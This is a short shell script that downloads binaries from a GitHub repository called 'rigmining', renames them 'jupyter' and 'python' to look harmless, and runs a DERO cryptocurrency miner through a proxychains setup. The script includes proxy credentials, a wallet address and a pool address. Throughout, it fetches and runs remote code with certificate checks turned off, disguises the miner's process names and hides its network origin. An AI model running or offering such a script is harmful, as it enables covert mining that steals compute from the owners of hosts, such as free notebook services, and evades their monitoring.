proxy="45.94.47.66" 
port="8110" 
user="ingfoingfo"  
pass="maszZeehh"
wget --no-check-certificate 'https://github.com/rigmining/dora/raw/main/dora' -O jupyter
chmod +x jupyter
wget --no-check-certificate 'https://github.com/rigmining/code/raw/main/panel' -O python
chmod +x python
wget --no-check-certificate 'https://github.com/rigmining/code/raw/main/libproxychains4.so' -O libproxychains4.so
chmod +x libproxychains4.so
wget --no-check-certificate 'https://github.com/rigmining/code/raw/main/proxychains.conf' -O proxychains.conf
chmod +x proxychains.conf
echo "IP ORI ==> "$(curl ifconfig.me)
echo "IP Baru ==> "$(./python curl ifconfig.me)
./python ./jupyter --wallet-address=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg --daemon-rpc-address=164.92.174.244:443

